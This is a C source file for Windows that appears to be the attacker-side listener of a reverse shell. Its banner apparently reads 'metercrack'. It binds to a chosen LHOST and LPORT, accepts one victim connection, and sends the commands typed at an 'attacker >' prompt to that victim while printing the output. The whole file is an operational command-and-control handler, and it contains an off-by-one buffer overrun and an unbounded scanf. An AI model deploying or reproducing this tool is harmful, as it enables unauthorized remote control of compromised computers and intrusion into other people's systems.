#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#define MAX_COMMAND_LENGTH 1024

// Function to initialize Winsock
void init_winsock() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed with error: %d\n", WSAGetLastError());
        exit(1);
    }
}

// Function to clean up Winsock
void cleanup_winsock() {
    WSACleanup();
}

// Function to print the banner
void print_banner() {
    printf(" _                               _    \n");
    printf(" _ __ ___   ___| |_ ___ _ __ ___ _ __ __ _  ___| | __\n");
    printf("| '_ ` _ \\ / _ \\ __/ _ \\ '__/ __| '__/ _` |/ __| |/ /\n");
    printf("| | | | | |  __/ ||  __/ | | (__| | | (_| | (__|   < \n");
    printf("|_| |_| |_|\\___|\\__\\___|_|  \\___|_|  \\__,_|\\___|_\\_\\\n");
    printf("\n");
}

// Function to handle communication with the connected client
void handle_client(SOCKET client_socket) {
    char buffer[MAX_COMMAND_LENGTH];
    int bytes_received;

    while (1) {
        // Print a prompt and get a command from the attacker
        printf("attacker > ");
        fgets(buffer, MAX_COMMAND_LENGTH, stdin);

        // Send the command to the client
        send(client_socket, buffer, strlen(buffer), 0);

        // Receive the response from the client
        bytes_received = recv(client_socket, buffer, MAX_COMMAND_LENGTH, 0);
        if (bytes_received <= 0) {
            printf("Connection closed or error occurred\n");
            break;
        }

        buffer[bytes_received] = '\0';  // Null-terminate the received data
        printf("%s", buffer);           // Print the result of the command
    }

    // Close the connection to the client
    closesocket(client_socket);
}

int main() {
    SOCKET server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    int addr_size = sizeof(client_addr);
    char LHOST[16];
    int LPORT;

    // Print the banner
    print_banner();

    // Prompt the user to enter LHOST and LPORT
    printf("Enter LHOST (IP address to listen on): ");
    scanf("%s", LHOST);
    printf("Enter LPORT (Port number to listen on): ");
    scanf("%d", &LPORT);

    // Initialize Winsock
    init_winsock();

    // Create a socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == INVALID_SOCKET) {
        printf("Socket creation failed with error: %d\n", WSAGetLastError());
        cleanup_winsock();
        exit(1);
    }

    // Set up the server address structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(LPORT);
    server_addr.sin_addr.s_addr = inet_addr(LHOST);  // Use entered LHOST IP

    // Bind the socket to the specified IP and port
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Bind failed with error: %d\n", WSAGetLastError());
        cleanup_winsock();
        exit(1);
    }

    // Start listening for incoming connections
    if (listen(server_socket, 1) == SOCKET_ERROR) {
        printf("Listen failed with error: %d\n", WSAGetLastError());
        cleanup_winsock();
        exit(1);
    }

    printf("Listening on %s:%d...\n", LHOST, LPORT);

    // Accept a connection from a client
    client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &addr_size);
    if (client_socket == INVALID_SOCKET) {
        printf("Accept failed with error: %d\n", WSAGetLastError());
        cleanup_winsock();
        exit(1);
    }

    printf("Client connected\n");

    // Handle communication with the client
    handle_client(client_socket);

    // Clean up and close server socket
    closesocket(server_socket);
    cleanup_winsock();

    return 0;
}
